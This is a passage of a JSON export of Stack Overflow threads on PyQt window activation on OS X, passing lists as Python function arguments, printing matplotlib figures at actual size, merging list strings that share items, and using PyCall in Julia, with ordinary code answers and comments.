"https://stackoverflow.com/users/984421/ekhumoro"}, "edited": false, "score": 0, "creation_date": 1428425690, "post_id": 29400317, "comment_id": 47152695, "body": "Have you tried <a href=\"https://doc.qt.io/qt-4.8/qwidget.html#activateWindow\" rel=\"nofollow noreferrer\"><code>activateWindow()</code></a>? Also, what happens if you launch the app as a bg process: i.e. <code>python menubar.py &amp;</code>?"}, {"owner": {"reputation": 135, "user_id": 3352942, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4248b204fa8a30092ac83400c5cbf2c8?s=128&d=identicon&r=PG&f=1", "display_name": "triccare", "link": "https://stackoverflow.com/users/3352942/triccare"}, "reply_to_user": {"reputation": 97291, "user_id": 984421, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l9J30.png?s=128&g=1", "display_name": "ekhumoro", "link": "https://stackoverflow.com/users/984421/ekhumoro"}, "edited": false, "score": 0, "creation_date": 1428504302, "post_id": 29400317, "comment_id": 47190971, "body": "See comments in answer below. Nothing works."}], "answers": [{"comments": [{"owner": {"reputation": 529, "user_id": 929623, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/bff435ae5fc2e73d7c7c8351231e8040?s=128&d=identicon&r=PG", "display_name": "user405", "link": "https://stackoverflow.com/users/929623/user405"}, "edited": false, "score": 1, "creation_date": 1428436023, "post_id": 29484492, "comment_id": 47158504, "body": "I have an app bundled with PyInstaller that has exactly this issue on OS X Yosemite: when launched it is the frontmost window but the menubar is still that of the Terminal, and I have to click another app and then back to mine for its menubar to take effect. I have tried all the following after the my_main_window.show() call: my_main_window.activateWindow() and my_main_window.raise_() and my_main_window.setWindowState( Qt.WindowActive ). None had any effect."}, {"owner": {"reputation": 135, "user_id": 3352942, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4248b204fa8a30092ac83400c5cbf2c8?s=128&d=identicon&r=PG&f=1", "display_name": "triccare", "link": "https://stackoverflow.com/users/3352942/triccare"}, "edited": false, "score": 1, "creation_date": 1428504127, "post_id": 29484492, "comment_id": 47190833, "body": "Playing with setWindowState and various WindowFlag settings have not worked. And there appears to be no direct info from the pyqt mailing list itself. So, there seems to be inherent in the system, at least with OS X."}, {"owner": {"reputation": 97291, "user_id": 984421, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l9J30.png?s=128&g=1", "display_name": "ekhumoro", "link": "https://stackoverflow.com/users/984421/ekhumoro"}, "reply_to_user": {"reputation": 135, "user_id": 3352942, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4248b204fa8a30092ac83400c5cbf2c8?s=128&d=identicon&r=PG&f=1", "display_name": "triccare", "link": "https://stackoverflow.com/users/3352942/triccare"}, "edited": false, "score": 1, "creation_date": 1428508531, "post_id": 29484492, "comment_id": 47194110, "body": "@triccare. There&#39;s really not much point posting to the PyQt mailing list, unless someone reading it happens to have had the same issue and discovered a solution. This is almost certainly a Qt-specific issue, so you need try their bugtracker (although the current status of <a href=\"https://bugreports.qt.io/browse/QTBUG-28327\" rel=\"nofollow noreferrer\">QTBUG-28327</a> doesn&#39;t seem to offer much hope)."}], "tags": [], "owner": {"reputation": 529, "user_id": 929623, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/bff435ae5fc2e73d7c7c8351231e8040?s=128&d=identicon&r=PG", "display_name": "user405", "link": "https://stackoverflow.com/users/929623/user405"}, "is_accepted": false, "score": 0, "last_activity_date": 1428384945, "creation_date": 1428384945, "answer_id": 29484492, "question_id": 29400317, "link": "https://stackoverflow.com/questions/29400317/pyqt-how-to-make-application-truly-active/29484492#29484492", "title": "pyqt how to make application truly active", "body": "<p>The identical problem affects some apps bundled by PyInstaller. The following blog post discusses the fix, however the fix is in terms of the PyInstaller boot loader, which would not be directly relevant to your code, but it might be informative.</p>\n\n<p><a href=\"http://dvitonis.net/blog/2015/01/07/menu-bar-not-visible-when-building-pyqt-app-bundle-pyinstaller-mac-osx-mavericks-yosemite/\" rel=\"nofollow\">http://dvitonis.net/blog/2015/01/07/menu-bar-not-visible-when-building-pyqt-app-bundle-pyinstaller-mac-osx-mavericks-yosemite/</a></p>\n\n<p>The problem relates to use of TransformProcessType() which is discussed in this linked article:</p>\n\n<p><a href=\"http://www.sheepsystems.com/developers_blog/TPT-show-menu.html\" rel=\"nofollow\">http://www.sheepsystems.com/developers_blog/TPT-show-menu.html</a></p>\n\n<p>I do not know what Qt method would relate to the Mac OS TransformProcessType() but you might experiment with calling QWidget.setWindowState() in your mainwindow's __init__().</p>\n"}, {"comments": [{"owner": {"reputation": 135, "user_id": 3352942, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4248b204fa8a30092ac83400c5cbf2c8?s=128&d=identicon&r=PG&f=1", "display_name": "triccare", "link": "https://stackoverflow.com/users/3352942/triccare"}, "edited": false, "score": 0, "creation_date": 1441736334, "post_id": 32405871, "comment_id": 52791212, "body": "Thanks. I&#39;ll try this out in the near future."}], "tags": [], "owner": {"reputation": 5345, "user_id": 333308, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/843c5f020ccaf86befb2c0b176c2c152?s=128&d=identicon&r=PG", "display_name": "aganders3", "link": "https://stackoverflow.com/users/333308/aganders3"}, "is_accepted": false, "score": 0, "last_activity_date": 1441397447, "creation_date": 1441397447, "answer_id": 32405871, "question_id": 29400317, "link": "https://stackoverflow.com/questions/29400317/pyqt-how-to-make-application-truly-active/32405871#32405871", "title": "pyqt how to make application truly active", "body": "<p>I was experiencing this behavior, but only when I launch with a <code>--nosplash</code> option to skip the splash screen in my application.</p>\n\n<p>That gave me a hint, and I developed this workaround using a 'dummy' splash screen:</p>\n\n<pre><code>widget = QtGui.QMainWindow() # or whatever your main window class is\ndummy = QtGui.QSplashScreen()\ndummy.show()\ndummy.finish(widget)\nwidget.show()\nwidget.raise_()\n</code></pre>\n"}], "owner": {"reputation": 135, "user_id": 3352942, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4248b204fa8a30092ac83400c5cbf2c8?s=128&d=identicon&r=PG&f=1", "display_name": "triccare", "link": "https://stackoverflow.com/users/3352942/triccare"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 476, "favorite_count": 0, "answer_count": 2, "score": 3, "last_activity_date": 1441397447, "creation_date": 1427920665, "question_id": 29400317, "link": "https://stackoverflow.com/questions/29400317/pyqt-how-to-make-application-truly-active", "title": "pyqt how to make application truly active", "body": "<p>Under OS X, using the zetcode <a href=\"http://zetcode.com/gui/pyqt4/menusandtoolbars/\" rel=\"nofollow\">example for menubar</a>, if one runs this from the command line:</p>\n\n<pre><code>$ python menubar.py\n</code></pre>\n\n<p>the application starts, but at the bottom of the window stack. This can be fixed by adding\n    self.raise_()</p>\n\n<p>to the code.</p>\n\n<p>However, the application is still not immediately active. The terminal application menubar still shows, not the pyqt menubar.</p>\n\n<p>The only way to get the pyqt menubar to show is to switch away from the pyqt application or terminal application and back again.</p>\n\n<p>Is this expected behavior? Is there anyway to fix this so the pyqt application immediately becomes active, i.e. the pyqt menubar immediately shows upon execution.</p>\n\n<p>Versions: OS X 10.9, Qt 4.8.6, PyQt 4.11.3, SIP 4.16.5, python 2.7.8</p>\n"}, {"tags": ["python", "list", "function", "parameters", "tuples"], "answers": [{"tags": [], "owner": {"reputation": 40613, "user_id": 4099593, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zweIW.png?s=128&g=1", "display_name": "Bhargav Rao", "link": "https://stackoverflow.com/users/4099593/bhargav-rao"}, "is_accepted": false, "score": 5, "last_activity_date": 1427920349, "creation_date": 1427920349, "answer_id": 29400211, "question_id": 29400146, "link": "https://stackoverflow.com/questions/29400146/passing-a-list-of-parameters-into-a-python-function/29400211#29400211", "title": "Passing a list of parameters into a Python function", "body": "<p>Pass the values as comma separated values</p>\n\n<pre><code>&gt;&gt;&gt; def func(x, *p):           # p is stored as tuple\n...     print \"x =\",x\n...     for i in p:\n...         print i\n...     return p\n... \n&gt;&gt;&gt; print func(1,2,3,4)        # x value 1, p takes the rest\nx = 1\n2\n3\n4\n(2,3,4)                        # returns p as a tuple\n</code></pre>\n\n<p>You can learn more by reading the <a href=\"https://docs.python.org/2.7/tutorial/controlflow.html#arbitrary-argument-lists\" rel=\"noreferrer\">docs</a></p>\n"}, {"tags": [], "owner": {"reputation": 10366, "user_id": 236195, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/53fd77df3990f126c69fb6ec4e0ea6de?s=128&d=identicon&r=PG", "display_name": "frnhr", "link": "https://stackoverflow.com/users/236195/frnhr"}, "is_accepted": true, "score": 19, "last_activity_date": 1427920669, "last_edit_date": 1427920669, "creation_date": 1427920466, "answer_id": 29400252, "question_id": 29400146, "link": "https://stackoverflow.com/questions/29400146/passing-a-list-of-parameters-into-a-python-function/29400252#29400252", "title": "Passing a list of parameters into a Python function", "body": "<pre><code>some_list = [\"some\", \"values\", \"in\", \"a\", \"list\", ]\nfunc(*some_list)\n</code></pre>\n\n<p>This is equivalent to:</p>\n\n<pre><code>func(\"some\", \"values\", \"in\", \"a\", \"list\")\n</code></pre>\n\n<p>The fixed <code>x</code> param might warrant a thought:</p>\n\n<pre><code>func(5, *some_list)\n</code></pre>\n\n<p>... is equivalent to:</p>\n\n<pre><code>func(5, \"some\", \"values\", \"in\", \"a\", \"list\")\n</code></pre>\n\n<p>If you don't specify value for <code>x</code> (<code>5</code> in the example above), then first value of <code>some_list</code> will get passed to <code>func</code> as <code>x</code> param.</p>\n"}], "owner": {"reputation": 392, "user_id": 458418, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/54d3de9fb4ef5fc299e2438b6fa7aee8?s=128&d=identicon&r=PG", "display_name": "Wilky94", "link": "https://stackoverflow.com/users/458418/wilky94"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 18752, "favorite_count": 2, "closed_date": 1427920551, "accepted_answer_id": 29400252, "answer_count": 2, "score": 5, "last_activity_date": 1427920669, "creation_date": 1427920146, "last_edit_date": 1427920647, "question_id": 29400146, "link": "https://stackoverflow.com/questions/29400146/passing-a-list-of-parameters-into-a-python-function", "closed_reason": "Duplicate", "title": "Passing a list of parameters into a Python function", "body": "<p>how would I pass an unknown number of parameters into a function? I have a function defined in the following way</p>\n\n<pre><code>def func(x, *p):\nreturn ...\n</code></pre>\n\n<p>I'm trying to pass in a list of values to use as parameters. I tried using a list and a tuple but the function always returns zero. Has anyone got any advice?\nThanks</p>\n"}, {"tags": ["python", "printing", "matplotlib", "plot", "scaling"], "comments": [{"owner": {"reputation": 12860, "user_id": 1168043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IBdCH.jpg?s=128&g=1", "display_name": "cphlewis", "link": "https://stackoverflow.com/users/1168043/cphlewis"}, "edited": false, "score": 0, "creation_date": 1427929184, "post_id": 29400116, "comment_id": 46980066, "body": "I think the missing step is forcing the Axes object to be a known proportion of the measured figure size, and then setting the axis limits so that the data-units match the real-world units."}], "answers": [{"comments": [{"owner": {"reputation": 12860, "user_id": 1168043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IBdCH.jpg?s=128&g=1", "display_name": "cphlewis", "link": "https://stackoverflow.com/users/1168043/cphlewis"}, "edited": false, "score": 1, "creation_date": 1427932230, "post_id": 29402645, "comment_id": 46981010, "body": "This is in the display -- does it work with printers? (the original question)"}, {"owner": {"reputation": 2692, "user_id": 2929207, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DxLMZ.png?s=128&g=1", "display_name": "Pablo Reyes", "link": "https://stackoverflow.com/users/2929207/pablo-reyes"}, "reply_to_user": {"reputation": 12860, "user_id": 1168043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IBdCH.jpg?s=128&g=1", "display_name": "cphlewis", "link": "https://stackoverflow.com/users/1168043/cphlewis"}, "edited": false, "score": 0, "creation_date": 1427932941, "post_id": 29402645, "comment_id": 46981185, "body": "If you open the saved figure and print it in 100% scale, it should match the specified size. For the printer, the dpi will only matter for the resolution of the image."}, {"owner": {"reputation": 12860, "user_id": 1168043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IBdCH.jpg?s=128&g=1", "display_name": "cphlewis", "link": "https://stackoverflow.com/users/1168043/cphlewis"}, "edited": false, "score": 0, "creation_date": 1427933938, "post_id": 29402645, "comment_id": 46981460, "body": "I just tried that and it didn&#39;t; much bigger than scale. Not even isometric -- a y-unit is 3cm on paper, an x-unit is 5cm. This is printed 100% scale, no auto-anything, View Actual Size in the viewer, everything I could think of. (I believe printers are mostly unreliable at this; it&#39;s plotters that are accurate.)"}, {"owner": {"reputation": 2692, "user_id": 2929207, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DxLMZ.png?s=128&g=1", "display_name": "Pablo Reyes", "link": "https://stackoverflow.com/users/2929207/pablo-reyes"}, "reply_to_user": {"reputation": 12860, "user_id": 1168043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IBdCH.jpg?s=128&g=1", "display_name": "cphlewis", "link": "https://stackoverflow.com/users/1168043/cphlewis"}, "edited": false, "score": 0, "creation_date": 1427934215, "post_id": 29402645, "comment_id": 46981549, "body": "What are you using for viewing/printing? I used the mac OS X preview. Then in the printer menu, The Scale is 100% and it did the job. Saving as pdf also reflected the size selected."}, {"owner": {"reputation": 12860, "user_id": 1168043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IBdCH.jpg?s=128&g=1", "display_name": "cphlewis", "link": "https://stackoverflow.com/users/1168043/cphlewis"}, "edited": false, "score": 0, "creation_date": 1427934310, "post_id": 29402645, "comment_id": 46981566, "body": "OS X Preview, standard desktop printer.  Will try GIMP."}, {"owner": {"reputation": 12860, "user_id": 1168043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IBdCH.jpg?s=128&g=1", "display_name": "cphlewis", "link": "https://stackoverflow.com/users/1168043/cphlewis"}, "edited": false, "score": 0, "creation_date": 1427935089, "post_id": 29402645, "comment_id": 46981743, "body": "Oh, that wasn&#39;t the problem, but I think we&#39;re interpreting the original problem differently. Added my bit of interpretation. Should possibly have edited your answer instead."}, {"owner": {"reputation": 12860, "user_id": 1168043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IBdCH.jpg?s=128&g=1", "display_name": "cphlewis", "link": "https://stackoverflow.com/users/1168043/cphlewis"}, "edited": false, "score": 0, "creation_date": 1427958819, "post_id": 29402645, "comment_id": 46988440, "body": "Nice way of setting up the margins -- makes it easy to adjust to fit in the labels and footnotes and so forth."}], "tags": [], "owner": {"reputation": 2692, "user_id": 2929207, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DxLMZ.png?s=128&g=1", "display_name": "Pablo Reyes", "link": "https://stackoverflow.com/users/2929207/pablo-reyes"}, "is_accepted": false, "score": 4, "last_activity_date": 1427931038, "creation_date": 1427931038, "answer_id": 29402645, "question_id": 29400116, "link": "https://stackoverflow.com/questions/29400116/using-matplotlib-how-can-i-print-something-actual-size/29402645#29402645", "title": "Using matplotlib, how can I print something &quot;actual size&quot;?", "body": "<p>Consider this example. Where I specify exactly the dimension of my axes in cm.\nmatplotlib works in inches, so I convert to inches. And then I also save it with a particular dpi (128) so that it matches the designed dimensions in my display. This of course varies for every display. I found that by trial and error, even though there might be other methods. Well here the code:</p>\n\n<pre><code>left_margin = 1.   # cm\nright_margin = 1.  # cm\nfigure_width = 10. # cm\nfigure_height = 7. # cm\ntop_margin = 1.    # cm\nbottom_margin = 1. # cm\n\nbox_width = left_margin + figure_width + right_margin   # cm\nbox_height = top_margin + figure_height + bottom_margin # cm\n\ncm2inch = 1/2.54 # inch per cm\n\n# specifying the width and the height of the box in inches\nfig = figure(figsize=(box_width*cm2inch,box_height*cm2inch))\nax = fig.add_subplot(111)\nax.plot([1,2,3])\n\nfig.subplots_adjust(left   = left_margin / box_width,\n                    bottom = bottom_margin / box_height,\n                    right  = 1. - right_margin / box_width,\n                    top    = 1. - top_margin   / box_height,\n                    )\nfig.savefig('ten_x_seven_cm.png', dpi=128)\n# dpi = 128 is what works in my display for matching the designed dimensions.\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 2692, "user_id": 2929207, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DxLMZ.png?s=128&g=1", "display_name": "Pablo Reyes", "link": "https://stackoverflow.com/users/2929207/pablo-reyes"}, "edited": false, "score": 0, "creation_date": 1427937396, "post_id": 29403206, "comment_id": 46982270, "body": "Now I understand the confusion. I was more concern about the real dimension of the axes."}, {"owner": {"reputation": 12860, "user_id": 1168043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IBdCH.jpg?s=128&g=1", "display_name": "cphlewis", "link": "https://stackoverflow.com/users/1168043/cphlewis"}, "reply_to_user": {"reputation": 2692, "user_id": 2929207, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DxLMZ.png?s=128&g=1", "display_name": "Pablo Reyes", "link": "https://stackoverflow.com/users/2929207/pablo-reyes"}, "edited": false, "score": 0, "creation_date": 1427995569, "post_id": 29403206, "comment_id": 47009627, "body": "Could one write a transReal transform that gets as close as the computer can to &quot;print a ruler&quot;? t I think the Axes would have to get information from the Figure that the Figure doesn&#39;t normally pass on, so, maybe not, and certainly a pain."}, {"owner": {"reputation": 71, "user_id": 4739862, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24cfe9f547f33e0bc0e26221e3b3e2c4?s=128&d=identicon&r=PG&f=1", "display_name": "GaryS", "link": "https://stackoverflow.com/users/4739862/garys"}, "edited": false, "score": 0, "creation_date": 1428064329, "post_id": 29403206, "comment_id": 47033942, "body": "Thank you all! Pablo&#39;s solution mostly worked, after modifying dpi to 72. In adding cphlewis&#39; piece, I ran into some bug (oddity?): my axis([xmin, xmax, ymin, ymax]) command is ignored ... same problem with set_xlim() and set_ylim() ... maybe a weird interaction with axis(&#39;equal&#39;)? The workaround was to plot everything, let matplotlib pick the x/y limits, try to force them (unsuccessfully), use ax.get_xlim() and ax.get_ylim() to determine what the actual limits are (not what I set them to), calc figure_width and figure_height from that, and continue with Pablo&#39;s solution. Thanks again!"}, {"owner": {"reputation": 12860, "user_id": 1168043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IBdCH.jpg?s=128&g=1", "display_name": "cphlewis", "link": "https://stackoverflow.com/users/1168043/cphlewis"}, "edited": false, "score": 0, "creation_date": 1428083354, "post_id": 29403206, "comment_id": 47043212, "body": "I think <code>axis([xo, x1, y0, y1])</code> is in terms of proportion of the Figure, not the data transform. Did you try <code>ax.set_xlim</code>, etc., instead of defining the axis size originally?"}, {"owner": {"reputation": 12860, "user_id": 1168043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IBdCH.jpg?s=128&g=1", "display_name": "cphlewis", "link": "https://stackoverflow.com/users/1168043/cphlewis"}, "edited": false, "score": 0, "creation_date": 1428099254, "post_id": 29403206, "comment_id": 47049332, "body": "also, you won&#39;t need axis(&#39;equal&#39;) if you define them to be equal when printed -- so I&#39;d take it out, to skip the workaround."}], "tags": [], "owner": {"reputation": 12860, "user_id": 1168043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IBdCH.jpg?s=128&g=1", "display_name": "cphlewis", "link": "https://stackoverflow.com/users/1168043/cphlewis"}, "is_accepted": false, "score": 4, "last_activity_date": 1427934990, "creation_date": 1427934990, "answer_id": 29403206, "question_id": 29400116, "link": "https://stackoverflow.com/questions/29400116/using-matplotlib-how-can-i-print-something-actual-size/29403206#29403206", "title": "Using matplotlib, how can I print something &quot;actual size&quot;?", "body": "<p>Add this to @pablo reyes' answer, check that the printer is at 100%, and it's pretty close;</p>\n\n<pre><code>ax.set_ylim(0,7)\nax.set_xlim(0,10)\n\nax.plot([0.5, 1.5],[0.25, 0.25],label='One cm?')\nax.plot([6,6],[1,2], label='One cm?')\nax.legend()\n</code></pre>\n\n<p>we force the axis to be a size we know, we make its data-transform match the real world, and we can \"print a ruler\". </p>\n"}, {"tags": [], "owner": {"reputation": 21, "user_id": 10686954, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38d2bbd7572f827ccfa2a10f3dc9c402?s=128&d=identicon&r=PG&f=1", "display_name": "Mahmoud", "link": "https://stackoverflow.com/users/10686954/mahmoud"}, "is_accepted": false, "score": 1, "last_activity_date": 1591903845, "last_edit_date": 1591903845, "creation_date": 1591895424, "answer_id": 62329799, "question_id": 29400116, "link": "https://stackoverflow.com/questions/29400116/using-matplotlib-how-can-i-print-something-actual-size/62329799#62329799", "title": "Using matplotlib, how can I print something &quot;actual size&quot;?", "body": "<p>Another method using <code>fig.add_axes</code> was quite accurate. I have included 1 cm grid as well. </p>\n\n<pre><code>import matplotlib.pyplot as plt\nimport matplotlib as mpl\n\n# This example fits a4 paper with 5mm margin printers\n\n# figure settings\nfigure_width = 28.7 # cm\nfigure_height = 20 # cm\nleft_right_margin = 1 # cm\ntop_bottom_margin = 1 # cm\n\n# Don't change\nleft   = left_right_margin / figure_width # Percentage from height\nbottom = top_bottom_margin / figure_height # Percentage from height\nwidth  = 1 - left*2\nheight = 1 - bottom*2\ncm2inch = 1/2.54 # inch per cm\n\n# specifying the width and the height of the box in inches\nfig = plt.figure(figsize=(figure_width*cm2inch,figure_height*cm2inch))\nax = fig.add_axes((left, bottom, width, height))\n\n# limits settings (important)\nplt.xlim(0, figure_width * width)\nplt.ylim(0, figure_height * height)\n\n# Ticks settings\nax.xaxis.set_major_locator(mpl.ticker.MultipleLocator(5))\nax.xaxis.set_minor_locator(mpl.ticker.MultipleLocator(1))\nax.yaxis.set_major_locator(mpl.ticker.MultipleLocator(5))\nax.yaxis.set_minor_locator(mpl.ticker.MultipleLocator(1))\n\n# Grid settings\nax.grid(color=\"gray\", which=\"both\", linestyle=':', linewidth=0.5)\n\n# your Plot (consider above limits)\nax.plot([1,2,3,5,6,7,8,9,10,12,13,14,15,17])\n\n# save figure ( printing png file had better resolution, pdf was lighter and better on screen)\nplt.show()\nfig.savefig('A4_grid_cm.png', dpi=1000)\nfig.savefig('tA4_grid_cm.pdf')\n</code></pre>\n\n<p>Results: \n<a href=\"https://i.stack.imgur.com/DOlV8.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/DOlV8.png\" alt=\"Results\"></a></p>\n"}], "owner": {"reputation": 71, "user_id": 4739862, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24cfe9f547f33e0bc0e26221e3b3e2c4?s=128&d=identicon&r=PG&f=1", "display_name": "GaryS", "link": "https://stackoverflow.com/users/4739862/garys"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1701, "favorite_count": 3, "answer_count": 3, "score": 7, "last_activity_date": 1591903845, "creation_date": 1427920063, "last_edit_date": 1427924784, "question_id": 29400116, "link": "https://stackoverflow.com/questions/29400116/using-matplotlib-how-can-i-print-something-actual-size", "title": "Using matplotlib, how can I print something &quot;actual size&quot;?", "body": "<p>I have a number of plots where the x- and y-axes are in centimeter units, and I am already using axis('equal') to ensure proper aspect ratios. I would like to print out those plots so that when I measure distances within my axes, the distances correspond to real-world centimeters.</p>\n\n<p>That is, a line that is 3 units (cm) long in the plot should print out to be 3 cm long. (A more complex example would be drawing a ruler in Matplotlib, and then printing it out for use /as/ a ruler.) I found solutions in matlab and mathematica, but not for Matplotlib. Is there a magic formula to achieve this? I believe it will require a special combination/ordering of: f<code>igure(figsize=??), axis('equal')</code>, <code>fig.canvas.draw()</code>, <code>fig.savefig('filename',format=\"??\")</code>, possibly some math with <code>fig.bbox</code> parameters, and perhaps one or more dpi-settings. I have tried many combinations but haven't hit on the right one. And maybe there is a way-easier approach ...</p>\n"}, {"tags": ["python", "list"], "answers": [{"comments": [{"owner": {"reputation": 47, "user_id": 3468837, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/c30a2722b8ceb839c600f44fda16a920?s=128&d=identicon&r=PG&f=1", "display_name": "user3468837", "link": "https://stackoverflow.com/users/3468837/user3468837"}, "edited": false, "score": 0, "creation_date": 1427920443, "post_id": 29400060, "comment_id": 46976350, "body": "Great! It seems to work. I will try to integrate it into my code"}, {"owner": {"reputation": 94141, "user_id": 2867928, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/a8DM1.jpg?s=128&g=1", "display_name": "kasravnd", "link": "https://stackoverflow.com/users/2867928/kasravnd"}, "reply_to_user": {"reputation": 47, "user_id": 3468837, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/c30a2722b8ceb839c600f44fda16a920?s=128&d=identicon&r=PG&f=1", "display_name": "user3468837", "link": "https://stackoverflow.com/users/3468837/user3468837"}, "edited": false, "score": 0, "creation_date": 1427920586, "post_id": 29400060, "comment_id": 46976439, "body": "@user3468837 glad of that! so you can tell this to community with vote and accepting the answer!"}], "tags": [], "owner": {"reputation": 94141, "user_id": 2867928, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/a8DM1.jpg?s=128&g=1", "display_name": "kasravnd", "link": "https://stackoverflow.com/users/2867928/kasravnd"}, "is_accepted": false, "score": 1, "last_activity_date": 1427919860, "creation_date": 1427919860, "answer_id": 29400060, "question_id": 29399880, "link": "https://stackoverflow.com/questions/29399880/combining-list-elements-containing-similar-substrings/29400060#29400060", "title": "combining list elements containing similar substrings", "body": "<p>You can use <a href=\"https://docs.python.org/2/library/sets.html#set-objects\" rel=\"nofollow\"><em>set.intersection</em></a> to check if the strings have any intersections within a recursion function :</p>\n\n<pre><code>lst = [\"A,B,C\", \"A,H,J\", \"T,Q,M\", \"B,R,X\"]\n\ndef comb(l):\n   for ind,i in enumerate(l) : \n      for ix,j in enumerate(l[ind+1:]) : \n         if set(i.split(',')).intersection(j.split(',')) and len(l)&gt;1:\n               return comb([l.pop(ind)+','+l.pop(ix)]+l)\n\n   return l\n\nprint comb(lst)\n['A,B,C,A,H,J,B,R,X', 'T,Q,M']\n</code></pre>\n"}], "owner": {"reputation": 47, "user_id": 3468837, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/c30a2722b8ceb839c600f44fda16a920?s=128&d=identicon&r=PG&f=1", "display_name": "user3468837", "link": "https://stackoverflow.com/users/3468837/user3468837"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 38, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1427919860, "creation_date": 1427919096, "last_edit_date": 1427919133, "question_id": 29399880, "link": "https://stackoverflow.com/questions/29399880/combining-list-elements-containing-similar-substrings", "title": "combining list elements containing similar substrings", "body": "<p>I need to combine all elements in a list that contain same sub strings. T.ex.:  </p>\n\n<pre><code>lst = [\"A,B,C\", \"A,H,J\", \"T,Q,M\", \"B,R,X\"]`\n</code></pre>\n\n<p>starting with first element \"A,B,C\" I need to look up either \"A\" or \"B\" or \"C\" in the rest of the elements in lst list. So by the end of the day elements <code>\"A,B,C\", \"A,H,J\"</code> and \"B,R,X\" should be put together as one string since they share either \"A\" or \"B\". The final lst list should look like this:</p>\n\n<pre><code>[\"A,B,C,A,H,J,B,Q,X\", \"T,Q,M\"]\n</code></pre>\n"}, {"tags": ["python", "graph", "igraph", "julia"], "comments": [{"owner": {"reputation": 5106, "user_id": 3005513, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XKxoq.png?s=128&g=1", "display_name": "Alex A.", "link": "https://stackoverflow.com/users/3005513/alex-a"}, "edited": false, "score": 2, "creation_date": 1427922147, "post_id": 29399865, "comment_id": 46977309, "body": "You&#39;re trying to load a <i>Python</i> module in Julia? I&#39;m pretty sure you can&#39;t do that."}, {"owner": {"reputation": 774, "user_id": 3935797, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/fb6313a96210b4d4897206279b7ebd7f?s=128&d=identicon&r=PG&f=1", "display_name": "RM-", "link": "https://stackoverflow.com/users/3935797/rm"}, "reply_to_user": {"reputation": 5106, "user_id": 3005513, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XKxoq.png?s=128&g=1", "display_name": "Alex A.", "link": "https://stackoverflow.com/users/3005513/alex-a"}, "edited": false, "score": 0, "creation_date": 1427925641, "post_id": 29399865, "comment_id": 46978796, "body": "I have used numpy in Julia with using PyCall, and then @pyimport numpy as np ... so I thought it could work..."}, {"owner": {"reputation": 5106, "user_id": 3005513, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XKxoq.png?s=128&g=1", "display_name": "Alex A.", "link": "https://stackoverflow.com/users/3005513/alex-a"}, "edited": false, "score": 0, "creation_date": 1427930167, "post_id": 29399865, "comment_id": 46980383, "body": "The error you posted here says that <code>@pyimport</code> is not defined but you&#39;ve used it successfully before? That&#39;s weird. Perhaps <code>PyCall</code> didn&#39;t load correctly...?"}, {"owner": {"reputation": 774, "user_id": 3935797, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/fb6313a96210b4d4897206279b7ebd7f?s=128&d=identicon&r=PG&f=1", "display_name": "RM-", "link": "https://stackoverflow.com/users/3935797/rm"}, "reply_to_user": {"reputation": 5106, "user_id": 3005513, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XKxoq.png?s=128&g=1", "display_name": "Alex A.", "link": "https://stackoverflow.com/users/3005513/alex-a"}, "edited": false, "score": 0, "creation_date": 1427992847, "post_id": 29399865, "comment_id": 47008157, "body": "I used it a couple of months ago and worked... now it does not."}, 